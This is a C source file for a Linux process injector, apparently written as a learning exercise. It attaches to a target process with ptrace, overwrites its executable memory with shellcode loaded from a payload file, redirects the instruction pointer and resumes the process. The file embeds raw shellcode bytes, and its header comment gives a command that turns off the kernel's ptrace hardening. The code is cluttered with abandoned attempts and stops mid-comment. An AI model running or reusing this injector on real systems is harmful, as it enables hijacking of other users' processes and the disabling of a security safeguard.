/*
	This code will serve as the "glue" that brings together all of the
		necessary functionality to inject code into a running process.

	CURRENT PLAN:
		1. Attach to the 'victim' process	
		2. Backup the current state of the processor registers
		3. Parse /proc/PID/maps to get some "r-xp" memory
		4. Backup the memory section
		5. Overwrite executable memory section
		6. Update RIP to point to the injected code
		7. Resume execution
		8. Wait until the injected code finishes running and hits a SIGTRAP
		9. Restore the process back to its original state

	APPROACH:
		1. ptrace(PTRACE_ATTACH, pid, NULL, NULL)
		2. ptrace(PTRACE_GETREGS, pid, NULL, &oldRegs)  // struct user_regs_struct
		3. 
		4. Two different approaches (?)
			4.a. ptrace(PTRACE_PEEKTEXT, pid, addr, NULL)  // Only reads one word of data
			4.b. process_vm_readv()
		5. Two different approaches (?)
			5.a. ptrace(PTRACE_POKETEXT, pid, addr, word)
			5.b. process_vm_writev()
		6. Multi-step process
			6.a. struct user_regs_struct regs;
			6.b. memcpy(&regs, &oldregs, sizeof(struct user_regs_struct));
			6.c. regs.rip = addr_of_injected_code;  // Update RIP to point to our injected code
			6.d. ptrace(PTRACE_SETREGS, pid, NULL, &regs);
		7. waitpid(pid, &status, WUNTRACED)
		8. To tell if control has been paused because of a SIGTRAP ("int 0x03")
			8.a. if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP) { printf("SIGTRAP received\n"); }
		9. Multi-step process
			9.a. ptrace(PTRACE_SETREGS, pid, NULL, &origregs);  // Recover the original registers
			9.b. ptrace(PTRACE_POKETEXT, pid, addr, word);  // Write the original memory back to the process
			9.c. ptrace(PTRACE_DETACH, pid, NULL, NULL);  // Detach from the process and resume execution

	ADDITIONAL PLANs:
		1. Detect where the original function is
		2. Inject our code
		3. Call our function
		4. Our function operates
		5. Then our function calls their function

	NECESSARY PREPARATION:
		"ptrace() returned errno:	Operation not permitted"
			This is due to kernel hardening in Linux disable this behavior by:
				`echo 0 > /proc/sys/kernel/yama/ptrace_scope`
				modifying /etc/sysctl.d/10-ptrace.conf

 */

#include <errno.h>							// errno
#include "Fileroad.h"						// os_path_join(), fread_a_file()
#include "Harklerror.h"						// HARKLE_ERROR
#include "Harkleproc.h"						// is_it_a_PID(), make_PID_into_proc()
#include "Harkletrace.h"					// htrace_write_data()
#include "Map_Memory.h"						// mapMem_ptr
#include "Memoroad.h"						// release_a_string()
#include <sys/mman.h>						// mmap()
#include "pmparser.h"						// pmStruct_ptr
#include <signal.h>							// signals
#include <stdbool.h>						// bool, true, false
#include <stdio.h>							// fprintf()
#include <string.h>							// strcmp()
#include <sys/ptrace.h>						// ptrace()
#include <sys/syscall.h>					// syscall
#include <sys/user.h>						// struct user_regs_struct
#include <sys/wait.h>						// waitpid()


// Hijacked!
void ptrace_read(int pid, unsigned long addr, void *vptr, int len);
void ptrace_write(int pid, unsigned long addr, void *vptr, int len);
// Dirty helper function
void dump_pid_mem(pid_t pid, void* mem_ptr, size_t memLen);


int main(int argc, char* argv[])
{
	// LOCAL VARIABLES
	bool success = true;  // Make this false if anything fails
	long ptRetVal = 0;  // ptrace() return value
	int errNum = 0;  // Store errno here
	pidDetails_ptr* procPIDStructs = parse_proc_PID_structs();
	pidDetails_ptr* temp_arr = procPIDStructs;
	pidDetails_ptr vicPID = NULL;  // Store the struct pointer for argv[1] here
	char* userProcPID = NULL;  // Will hold char* holding /proc/<PID>/ built from user's choice
	struct user_regs_struct oldRegs;  // Store the state of the registers here
	struct user_regs_struct newRegs;  // Modify the registers here
	pmStruct_ptr procMaps_ptr = NULL;  // /proc/PID/maps for argv[1]
	pmStruct_ptr tmpPM_ptr = NULL;  // Temporary variable to print out certain mappings
	struct iovec* localBackup = NULL;  // Local backup of the PIDs executable memory map
	char* payloadFilename = NULL;  // Store the payload absolute or relative filename here
	char* payloadContents = NULL;  // Store the contents of the payload here
	off_t payloadSize = 0;  // Store the length of the payload here
	int tempRetVal = 0;  // Store int return values here
	char code[] = { 0xEB, 0x11, 0x48, 0x31, 0xC0, 0xB0, 0x01, 0x48, 0x89, 0xC7, 0x5E, 0x48, 0x31, 0xD2, 0xB2, 0x29, \
	                0x0F, 0x05, 0xCC, 0xE8, 0xEA, 0xFF, 0xFF, 0xFF, 0x54, 0x68, 0x61, 0x74, 0x20, 0x77, 0x65, 0x61, \
	                0x76, 0x65, 0x20, 0x67, 0x6F, 0x74, 0x74, 0x61, 0x20, 0x67, 0x6F, 0x2E, 0x20, 0x50, 0x69, 0x6E, \
	                0x6B, 0x20, 0x73, 0x6C, 0x69, 0x70, 0x2E, 0x20, 0x2D, 0x43, 0x61, 0x72, 0x64, 0x69, 0x20, 0x42, \
	                0x0A, 0x00 };
	char spinCode[5] = { 0x90, 0x90, 0x90, 0xEB, 0xFE };
	void* codeStart = NULL;  // Pointer to the beginning of the executable shell code
	size_t codeStartOffset = 0;  // Store the payload's offset of the nopnopnop here
	char nopCanary[3] = { 0x90, 0x90, 0x90 };  // Look for this nop slide in the shellcode
	mapMem_ptr mappedPayload = NULL;
	struct sigaction sigact;  // Used to specify actions for specific signals
	int sigNum = 1;  // Signal numbers to iterate through

	// INPUT VALIDATION
	// procPIDStructs
	if (!procPIDStructs)
	{
		HARKLE_ERROR(injector, main, parse_proc_PID_structs failed);
		success = false;
	}
	// Arguments
	if (argc < 2)
	{
		fprintf(stderr, "\nToo few arguments!\nusage: injector.exe <PID>\n\n");
		success = false;
	}
	else if (argc > 2)
	{
		fprintf(stderr, "\nToo many arguments!\nusage: injector.exe <PID>\n\n");
		success = false;
	}
	else if (false == is_it_a_PID(argv[1]))
	{
		fprintf(stderr, "\nInvalid PID!\nusage: injector.exe <PID>\nexample: injector.exe 1234\n\n");
		success = false;
	}
	else
	{
		// Create absolute path of PID
		userProcPID = make_PID_into_proc(argv[1]);

		if (!userProcPID)
		{
			HARKLE_ERROR(injector, main, make_PID_into_proc failed);
			success = false;
		}
		else
		{
			success = false;  // Set to true when PID match is found
			while (*temp_arr && success == false)
			{
				if (0 == strcmp((*temp_arr)->pidName, userProcPID) && (*temp_arr)->stillExists == true)
				{
					success = true;
					vicPID = *temp_arr;
					fprintf(stdout, "\nParsing %s (%s)\n", (*temp_arr)->pidName, (*temp_arr)->pidCmdline);
				}
				else
				{
					temp_arr++;
				}
			}

			if (success == false)
			{
				fprintf(stderr, "\nUnable to locate %s.\n\n", userProcPID);
			}
			else
			{
				fprintf(stdout, "[*] Located /proc/PID/\n");  // DEBUGGING
			}
		}
	}

	// SIGNAL HANDLER == IGNORE
	if (success == true)
	{
		sigemptyset(&sigact.sa_mask);  // Zeroize the mask of signals which should be blocked
		sigact.sa_flags = 0;  // Can't think of any good flags to add for what I'm doing
		sigact.sa_handler = SIG_IGN;  // Apparently, instead of handling the SIGNALS, we'll just ignore them

		// Set the action
		// rt_sigaction() doesn't work as (barely) documented
		// Reading sigaction() source code leads me to believe that rt_sigaction wants
		// 	SIGRTMAX / 8 as the fourth argument (NOT sizeof(sigset_t) like the man page says).
		// It works.  For more details, read:
		//	https://github.com/hark130/Latissimus_Dorsi/blob/practice/Research_Documents/3-4-1-rt_sigaction.txt
		if (-1 == syscall(SYS_rt_sigaction, SIGINT, &sigact, NULL, SIGRTMAX / 8))
		{
			errNum = errno;
			HARKLE_ERROR(nosig, main, syscall failed);
			HARKLE_ERRNO(nosig, SYS_rt_sigaction, errNum);
			success = false;
		}
	}

	// INJECTOR
	// 1. Attach to the 'victim' process
	if (true == success)
	{
		ptRetVal = ptrace(PTRACE_ATTACH, vicPID->pidNum, NULL, NULL);

		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_ATTACH failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
			// fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
			success = false;
		}
		else
		{
			// Wait for PID to stop
			if (-1 == waitpid(vicPID->pidNum, &errNum, WUNTRACED))
			{
				errNum = errno;
				HARKLE_ERROR(injector, main, waitpid failed);
				HARKLE_ERRNO(injector, waitpid, errNum);
				// fprintf(stderr, "waitpid() returned errno:\t%s\n", strerror(errNum));
				success = false;
			}
			else
			{
				fprintf(stdout, "[*] Attched to PID\n");  // DEBUGGING
				// getchar();  // DEBUGGING
			}
		}
	}

	// 2. Backup the current state of the processor registers
	if (true == success)
	{
		ptRetVal = ptrace(PTRACE_GETREGS, vicPID->pidNum, NULL, &oldRegs);

		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_GETREGS failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
			// fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] Backed up PID's processor registers\n");  // DEBUGGING
			newRegs = oldRegs;  // Starting point for new register values
			fprintf(stdout, "RAX:\t%llx\n", oldRegs.rax);  // DEBUGGING
			fprintf(stdout, "RCX:\t%llx\n", oldRegs.rcx);  // DEBUGGING
			fprintf(stdout, "RDX:\t%llx\n", oldRegs.rdx);  // DEBUGGING
			fprintf(stdout, "RSI:\t%llx\n", oldRegs.rsi);  // DEBUGGING
			fprintf(stdout, "RDI:\t%llx\n", oldRegs.rdi);  // DEBUGGING
			fprintf(stdout, "RIP:\t%llx\n", oldRegs.rip);  // DEBUGGING
			fprintf(stdout, "RSP:\t%llx\n", oldRegs.rsp);  // DEBUGGING
			// getchar();  // DEBUGGING
		}
	}

	// 3. Parse /proc/PID/maps to get some "r-xp" memory
	if (true == success)
	{
		// 3.1. /proc/PID/maps 
		procMaps_ptr = pmparser_parse(vicPID->pidNum);

		if (!procMaps_ptr)
		{
			HARKLE_ERROR(injector, main, pmparser_parse failed);
			success = false;
		}
		else
		{
			tmpPM_ptr = procMaps_ptr;
			tempRetVal = 0;  // TEST OTHER MEMORY SECTIONS
			while (tmpPM_ptr)
			{
				// if (1 == tmpPM_ptr->is_w)
				if (1 == tmpPM_ptr->is_x)
				{
					if (!tempRetVal)
					{
						// pmparser_print(tmpPM_ptr, 0);  // DEBUGGING
						// fprintf(stdout, "\n");  // DEBUGGING
						// fprintf(stdout, "[*] Found rw-p PID memory\n");  // DEBUGGING
					    fprintf(stdout, "[*] Found r-xp PID memory\n");  // DEBUGGING
						break;  // Found one
					}
					else
					{
						tempRetVal--;
					}
				}

				tmpPM_ptr = tmpPM_ptr->next;
			}			
		}
	}

	// 4. Backup the memory section
	if (true == success)
	{
		localBackup = copy_remote_to_local(vicPID->pidNum, \
										   tmpPM_ptr->addr_start, \
										   (size_t)tmpPM_ptr->length);

		if (!localBackup)
		{
			HARKLE_ERROR(injector, main, copy_remote_to_local failed);
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] Successfully backed up PID memory\n");  // DEBUGGING
		}
		// else
		// {
		// 	for (size_t i = 0; i < localBackup->iov_len; i++)
		// 	{
		// 		if (0 == i % 100)
		// 		{
		// 			fprintf(stdout, "\n");
		// 		}

		// 		// fprintf(stdout, "0x%08X ", (char)(*((char*)localBackup->iov_base + i)));
		// 		char letter = (char)(*((char*)localBackup->iov_base + i));
		// 		if (letter >= ' ' && letter <= '~')
		// 		{
		// 			fprintf(stdout, "%c", letter);
		// 		}
		// 	}
		// 	fprintf(stdout, "\n");
		// }
	}
	
	// 5. Read in the payload
	if (true == success)
	{
		// 5.1 Determine payload location
		payloadFilename = os_path_join("./3-22-1_Payloads", "payload_64_write_1.o", true);		
		
		if (!payloadFilename)
		{
			HARKLE_ERROR(injector, main, os_path_join failed);
			success = false;
		}
		else
		{			
			// 5.2. Size the payload
			// fprintf(stdout, "Filename is %s\n", payloadFilename);  // DEBUGGING
			// ↓↓↓ COMMENTED OUT BECAUSE OF A BUG IN os_path_join() ↓↓↓
			// payloadContents = fread_a_file(payloadFilename, &tempRetVal);
			payloadSize = size_a_file("./3-22-1_Payloads/payload_64_write_1.o", &tempRetVal);
			// payloadSize = size_a_file("./3-22-1_Payloads/payload_64_write_2.o", &tempRetVal);
			
			if (-1 == payloadSize)
			{
				HARKLE_ERROR(injector, main, size_a_file failed);
				fprintf(stderr, "size_a_file() returned errno:\t%s\n", strerror(tempRetVal));
				success = false;
			}
			else
			{
				// 5.3. Read the payload in
				// ↓↓↓ COMMENTED OUT BECAUSE OF A BUG IN os_path_join() ↓↓↓
				// payloadContents = fread_a_file(payloadFilename);
				payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_1.o");
				// payloadContents = fread_a_file("./3-22-1_Payloads/payload_64_write_2.o");

				if (!payloadContents)
				{
					HARKLE_ERROR(injector, main, fread_a_file failed);
					success = false;
				}
			}

			// Map the shell code into memory
			// mappedPayload = map_file("./3-22-1_Payloads/payload_64_write_1.o");

			// if (!mappedPayload)
			// {
			// 	HARKLE_ERROR(injector, main, map_file failed);
			// 	success = false;
			// }
			// else
			// {
			// 	fprintf(stdout, "[*] Shellcode mapped into memory\n");  // DEBUGGING
			// }

			// Map the 'spinning' shell code into memory
			// mappedPayload = map_file("./3-22-1_Payloads/payload_64_write_2.o");

			// if (!mappedPayload)
			// {
			// 	HARKLE_ERROR(injector, main, map_file failed);
			// 	success = false;
			// }
			// else
			// {
			// 	fprintf(stdout, "[*] Shellcode mapped into memory\n");  // DEBUGGING
			// }

			// Get the spin code
			// payloadContents = spinCode;
			// payloadSize = sizeof(spinCode);
		}
	}

	// DEBUGGING
	// payloadContents = code;
	// payloadSize = sizeof(code);

	// 6. Overwrite executable memory section
	if (true == success)
	{
		// 6.1. Change the permissions on the memory
		// Current working theory... some Linux OSs won't permit mapped memory space
		//	to be rwxp.  If this is true, I'll have to flip permissions on the PID's
		//	memory space depending on what I want to do in that moment.
// 		tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
// 									  MROAD_PROT_READ | MROAD_PROT_WRITE | MROAD_PROT_EXEC);
		// It's possible that some Linux implementations won't allow mapped memory space
		//	to contain both write *AND* execute permissions at the same time.
		tempRetVal = 0;
		// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
		// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);

		// getchar();  // DEBUGGING
		if (tempRetVal)
		{
			HARKLE_ERROR(injector, main, change_mmap_prot failed);
			fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
			success = false;
		}
		else
		{
			// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
			fprintf(stdout, "[*] Modified mapped memory permissions (rw-p)\n");  // DEBUGGING

			// fprintf(stdout, "BEFORE\n");  // DEBUGGING
			// for (int i = 0; i < tmpPM_ptr->length; i++)
			// {
			// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
			// }
			// fprintf(stdout, "\n");


			// getchar();  // DEBUGGING
			// getchar();  // DEBUGGING
			// 6.2. Write the payload to memory
			// Attempt #1 - Read in shellcode and write it to the process
			// tempRetVal = copy_local_to_remote(vicPID->pidNum, \
			// 								  tmpPM_ptr->addr_start, \
			// 								  payloadContents, \
			// 								  payloadSize);

			// Attempt #2 - Write a buffer of shellcode to the process
			// if (copy_local_to_remote(vicPID->pidNum, \
			// 						 tmpPM_ptr->addr_start, \
			// 						 payloadContents, \
			// 						 sizeof(code)/sizeof(*code)))

			// Attempt #3 - Same as #1 but use ptrace(PTRACE_POKEDATA) instead
			// tempRetVal = htrace_write_data(vicPID->pidNum, \
			// 							   tmpPM_ptr->addr_start, \
			// 							   payloadContents, \
			// 							   payloadSize);

			// Attempt #4 - Same as #1 but I advance a pointer length into the target space (?!?!?!)
			// tempRetVal = copy_local_to_remote(vicPID->pidNum, \
			// 								  tmpPM_ptr->addr_start + sizeof(void*), \
			// 								  payloadContents, \
			// 								  payloadSize);

			// Attempt #5 - Same as #3 but I advance a pointer length into the target space (?!?!?!)
			// tempRetVal = htrace_write_data(vicPID->pidNum, \
			// 							   tmpPM_ptr->addr_start + sizeof(void*), \
			// 							   payloadContents, \
			// 							   payloadSize);

			// Attempt #6 - Use someone else's ptrace(PTRACE_POKEDATA) wrapper (is mine buggy?!?!)
			// tempRetVal = 0;
			// fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start);
			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
			// // dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, sizeof(void*) * 4);
			// ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)payloadContents, (int)payloadSize);
			// fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start);
			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, sizeof(void*) * 4);

			// Attempt #7 - Same as #6 but I advance a pointer length into the target space (?!?!?!)
			// tempRetVal = 0;
			// fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start + sizeof(void*));
			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start + sizeof(void*), sizeof(void*) * 4);
			// ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start + sizeof(void*), (void*)payloadContents, (int)payloadSize);
			// fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start + sizeof(void*));
			// dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start + sizeof(void*), sizeof(void*) * 4);

			// Attempt #8 - Use someone else's ptrace(PTRACE_POKEDATA) wrapper to write my ACTUAL shellcode
			tempRetVal = 0;
			fprintf(stdout, "BEFORE:\t%p\n", tmpPM_ptr->addr_start);
			dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);
			ptrace_write(vicPID->pidNum, (unsigned long)tmpPM_ptr->addr_start, (void*)payloadContents, (int)payloadSize);
			fprintf(stdout, "AFTER\t%p\n", tmpPM_ptr->addr_start);
			dump_pid_mem(vicPID->pidNum, tmpPM_ptr->addr_start, payloadSize);

			if (tempRetVal)
			{
				// HARKLE_ERROR(injector, main, copy_local_to_remote failed);
				// HARKLE_ERRNO(injector, copy_local_to_remote, tempRetVal);
				// HARKLE_ERROR(injector, main, htrace_write_data failed);
				// HARKLE_ERRNO(injector, htrace_write_data, tempRetVal);
				success = false;
			}
			// else
			// {
			// 	fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
			// }

			// if (tempRetVal)
			// {
			// 	HARKLE_ERROR(injector, main, htrace_write_data failed);
			// 	success = false;
			// }
			else
			{
				// fprintf(stdout, "\nAFTER\n");  // DEBUGGING
				// for (int i = 0; i < tmpPM_ptr->length; i++)
				// {
				// 	fprintf(stdout, "%02X", (*(((unsigned char*)tmpPM_ptr->addr_start) + i)));
				// }
				// fprintf(stdout, "\n");

				fprintf(stdout, "[*] Overwrote PID memory space\n");  // DEBUGGING
				
				// 6.3. Change the permissions on the memory back to r-xp
				tempRetVal = 0;
				// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
				// 							  MROAD_PROT_READ | MROAD_PROT_EXEC);

				// if (tempRetVal)
				// {
				// 	HARKLE_ERROR(injector, main, change_mmap_prot failed);
				// 	fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
				// 	success = false;
				// }
				// else
				// {
				// 	fprintf(stdout, "[*] Modified mapped memory permissions (r-xp)\n");  // DEBUGGING
				// }
			}
		}
	}

	// DEBUGGING
// 	void *buf;
// 	if (true == success)
// 	{
// 		buf = mmap(0,sizeof(code),PROT_READ|PROT_WRITE|PROT_EXEC,
//                    MAP_PRIVATE|MAP_ANON,-1,0);
//     	memcpy(buf, code, sizeof(code));
//     	// fprintf(stdout, "Writing:\t%s", (char*)buf);  // DEBUGGING
// 	}

	// 7. Update RIP to point to the injected code
	if (true == success)
	{
		// 7.1. Find nopnopnop slide in the opcode
		// codeStart = mem_hunt((void*)payloadContents, (void*)nopCanary, payloadSize, sizeof(nopCanary) / sizeof(*nopCanary));
		// codeStart = mem_hunt((void*)payloadContents, "909090", payloadSize, strlen("909090"));
		// codeStart = payloadContents;
		// codeStart = mem_hunt((void*)(mappedPayload->fileMem_ptr), (void*)nopCanary, mappedPayload->memSize, sizeof(nopCanary) / sizeof(*nopCanary));
		// codeStart = mem_hunt((void*)tmpPM_ptr->addr_start, (void*)nopCanary, tmpPM_ptr->length, sizeof(nopCanary) / sizeof(*nopCanary));
		// codeStart = payloadContents;
		// fprintf(stdout, "LET'S SEARCH THE PAYLOAD CONTENTS FOR THE NOP SLIDE!\n");  // DEBUGGING
		// mem_hunt((void*)payloadContents, (void*)nopCanary, payloadSize, sizeof(nopCanary) / sizeof(*nopCanary));  // DEBUGGING

		codeStartOffset = pid_mem_hunt(vicPID->pidNum, (void*)tmpPM_ptr->addr_start, (void*)nopCanary, tmpPM_ptr->length, sizeof(nopCanary) / sizeof(*nopCanary));

		if (-1 == codeStartOffset)
		{
			HARKLE_ERROR(injector, main, pid_mem_hunt failed to find the nop slide);
			success = false;
		}
		else if (-2 == codeStartOffset)
		{
			HARKLE_ERROR(injector, main, pid_mem_hunt failed);
			success = false;
		}
		else if (codeStartOffset < 0)
		{
			HARKLE_ERROR(injector, main, pid_mem_hunt claimed success but returned a negative offset);
			success = false;
		}
		else
		{
			codeStart = tmpPM_ptr->addr_start + codeStartOffset;
		}

		if (!codeStart)
		{
			HARKLE_ERROR(injector, main, Failed to find the beginning of the shellcode);
			success = false;
		}
		else
		{
			// fprintf(stdout, "%02X", *((unsigned char*)codeStart));  // DEBUGGING
			// 7.2. Modify existing registers to reflect the new RIP
	// 		newRegs.rip = (unsigned long long)buf;
			// newRegs.rip = (unsigned long long)code;
			// newRegs.rip = (unsigned long long)tmpPM_ptr->addr_start;
			// newRegs.rip = (unsigned long long)tmpPM_ptr->addr_start + 0x0180;  // Temp hard-coded value to test a theory
			//////////////////////////////////////////////// HERE ////////////////////////////////////////////////
			// Do a strstr on nopnopnop (909090) and set RIP there
			newRegs.rip = (unsigned long long)codeStart + 2;  // Is RIP being decremented upon resume?!
			// newRegs.rip = (unsigned long long)codeStart;
			fprintf(stdout, "RIP: \t%llx\n", newRegs.rip);  // DEBUGGING
			fprintf(stdout, "Code:\t%llx\n", (unsigned long long)codeStart);  // DEBUGGING

			// 7.3. Update the victim PID's process registers
			ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &newRegs);

			if (-1 == ptRetVal)
			{
				errNum = errno;
				HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
				fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
				success = false;
			}
			else
			{
				fprintf(stdout, "[*] Successfully updated RIP\n");  // DEBUGGING
			}
		}
	}
	// getchar();  // DEBUGGING

	/* DEBUGGING */
	ptRetVal = ptrace(PTRACE_GETREGS, vicPID->pidNum, NULL, &newRegs);

	if (-1 == ptRetVal)
	{
		errNum = errno;
		HARKLE_ERROR(injector, main, PTRACE_GETREGS failed);
		HARKLE_ERRNO(injector, ptrace, errNum);
		success = false;
	}
	else
	{
		fprintf(stdout, "[*] REretrieved PID's processor registers post-RIP hijacking\n");  // DEBUGGING
		fprintf(stdout, "RAX:\t%llx\n", newRegs.rax);  // DEBUGGING
		fprintf(stdout, "RCX:\t%llx\n", newRegs.rcx);  // DEBUGGING
		fprintf(stdout, "RDX:\t%llx\n", newRegs.rdx);  // DEBUGGING
		fprintf(stdout, "RSI:\t%llx\n", newRegs.rsi);  // DEBUGGING
		fprintf(stdout, "RDI:\t%llx\n", newRegs.rdi);  // DEBUGGING
		fprintf(stdout, "RIP:\t%llx\n", newRegs.rip);  // DEBUGGING
		fprintf(stdout, "RSP:\t%llx\n", newRegs.rsp);  // DEBUGGING
		// getchar();  // DEBUGGING
	}	

	// 8. Resume execution
	if (true == success)
	{
		ptRetVal = ptrace(PTRACE_CONT, vicPID->pidNum, NULL, NULL);
		
		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
			fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] PID's execution resumed\n");  // DEBUGGING
		}
	}
	getchar();  // DEBUGGING

	// 9. Wait until the injected code finishes running and hits a SIGTRAP
	// if (true == success)
	// {
	// 	if (-1 == waitpid(vicPID->pidNum, &errNum, WUNTRACED))
	// 	{
	// 		errNum = errno;
	// 		HARKLE_ERROR(injector, main, waitpid failed);
	// 		fprintf(stderr, "waitpid() returned errno:\t%s\n", strerror(errNum));
	// 		success = false;
	// 	}
	// 	else
	// 	{
	// 		fprintf(stdout, "[*] PID terminated\n");  // DEBUGGING
			
	// 		if (WIFSTOPPED(errNum) && WSTOPSIG(errNum) == SIGTRAP)
	// 		{
	// 			fprintf(stdout, "[*] PID reached the SIGTRAP\n");  // DEBUGGING
	// 		}
	// 		else
	// 		{
	// 			HARKLE_ERROR(injector, main, SIGTRAP not found);
	// 			// success = false;
	// 		}

	// 	    if (WIFEXITED(errNum)) 
	// 	    {
	// 	        printf("Exited normally with status %d\n", WEXITSTATUS(errNum));
	// 	    }
	// 	    else if (WIFSIGNALED(errNum)) 
	// 	    {
	// 	        printf("Exited due to receiving signal %d\n", WTERMSIG(errNum));
	// 	    }
	// 	    else if (WIFSTOPPED(errNum)) 
	// 	    {
	// 	        printf("Stopped due to receiving signal %d\n", WSTOPSIG(errNum));
	// 	    }
	// 	    else 
	// 	    {
	// 	        printf("Something strange just happened.\n");
	// 	    }
	// 	}
	// }
	// getchar();  // DEBUGGING

	// 10. Restore the process back to its original state
	// if (true == success)
	// {
	// 	// 9.1. Restore the registers
	// 	ptRetVal = ptrace(PTRACE_SETREGS, vicPID->pidNum, NULL, &oldRegs);

	// 	if (-1 == ptRetVal)
	// 	{
	// 		errNum = errno;
	// 		HARKLE_ERROR(injector, main, PTRACE_SETREGS failed);
	// 		fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
	// 		success = false;
	// 	}
	// 	else
	// 	{
	// 		fprintf(stdout, "[*] Successfully restored registers\n");  // DEBUGGING
	// 	}
	// 	// getchar();  // DEBUGGING

	// 	// 10.2. Change memory to write permissions
	// 	tempRetVal = 0;
	// 	// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
	// 	// 							  MROAD_PROT_READ | MROAD_PROT_WRITE);

	// 	// getchar();  // DEBUGGING
	// 	if (tempRetVal)
	// 	{
	// 		HARKLE_ERROR(injector, main, change_mmap_prot failed);
	// 		fprintf(stderr, "change_mmap_prot() returned errno:\t%s\n", strerror(tempRetVal));
	// 		success = false;
	// 	}
	// 	else
		{
	// 		// fprintf(stdout, "Writing:\t%s", payloadContents);  // DEBUGGING
	// 		fprintf(stdout, "[*] REmodified mapped memory permissions (rw-p)\n");  // DEBUGGING
		
	// 		// 10.3. Restore the mapped memory
	// 		if (copy_local_to_remote(vicPID->pidNum, \
	// 								 tmpPM_ptr->addr_start, \
	// 								 localBackup->iov_base, \
	// 								 localBackup->iov_len))
	// 		{
	// 			HARKLE_ERROR(injector, main, copy_local_to_remote failed);
	// 			success = false;
	// 		}
	// 		else
	// 		{
	// 			fprintf(stdout, "[*] Restored PID memory space\n");  // DEBUGGING

	// 			// 10.4. Change the permissions on the memory back to r-xp
	// 			tempRetVal = 0;
	// 			// tempRetVal = change_mmap_prot(tmpPM_ptr->addr_start, tmpPM_ptr->length, \
	// 			// 							  MROAD_PROT_READ | MROAD_PROT_EXEC);

	// 			if (tempRetVal)
	// 			{
	// 				HARKLE_ERROR(injector, main, change_mmap_prot failed);
	// 				HARKLE_ERRNO(injector, change_mmap_prot, tempRetVal);
	// 				success = false;
	// 			}
	// 			else
	// 			{
	// 				fprintf(stdout, "[*] REmodified mapped memory permissions post-restoral (r-xp)\n");  // DEBUGGING
	// 			}
	// 		}
	// 		// getchar();  // DEBUGGING
	// 	}
		
		// 10.4. Detack from the process to resume execution
		ptRetVal = ptrace(PTRACE_DETACH, vicPID->pidNum, NULL, NULL);

		if (-1 == ptRetVal)
		{
			errNum = errno;
			HARKLE_ERROR(injector, main, PTRACE_DETACH failed);
			HARKLE_ERRNO(injector, ptrace, errNum);
			// fprintf(stderr, "ptrace() returned errno:\t%s\n", strerror(errNum));
			success = false;
		}
		else
		{
			fprintf(stdout, "[*] PID detached\n");  // DEBUGGING
		}
		// getchar();  // DEBUGGING
	}
	// getchar();  // DEBUGGING

	// CLEAN UP
	// 1. procPIDStructs
	if (procPIDStructs)
	{
		if (false == free_PID_struct_arr(&procPIDStructs))
		{
			HARKLE_ERROR(injector, main, free_PID_struct_arr failed);
		}
	}
	temp_arr = NULL;

	// 2. userProcPID
	if (userProcPID)
	{
		if (false == release_a_string(&userProcPID))
		{
			HARKLE_ERROR(injector, main, release_a_string failed);
		}
	}

	// 3. 
	if (procMaps_ptr)
	{
		pmparser_free(procMaps_ptr);
		procMaps_ptr = NULL;
	}

	// 4. localBackup
	if (localBackup)
	{
		if (false == free_iovec_struct(&localBackup, true))
		{
			HARKLE_ERROR(injector, main, free_iovec_struct failed);
		}
	}
	
	// 5. payloadFilename
	if (payloadFilename)
	{
		if (false == release_a_string(&payloadFilename))
		{
			HARKLE_ERROR(injector, main, release_a_string failed);
		}
	}
	
	// 6. payloadContents
	if (payloadContents)
	{
		if (false == release_a_string(&payloadContents))
		{
			HARKLE_ERROR(injector, main, release_a_string failed);
		}
	}

	// 7. mappedPayload
	if (mappedPayload)
	{
		free_struct(&mappedPayload);
	}

	// DONE
	return 0;
}


/*
 * ptrace_read()
 *
 * Use ptrace() to read the contents of a target process' address space.
 *
 * args:
 * - int pid: pid of the target process
 * - unsigned long addr: the address to start reading from
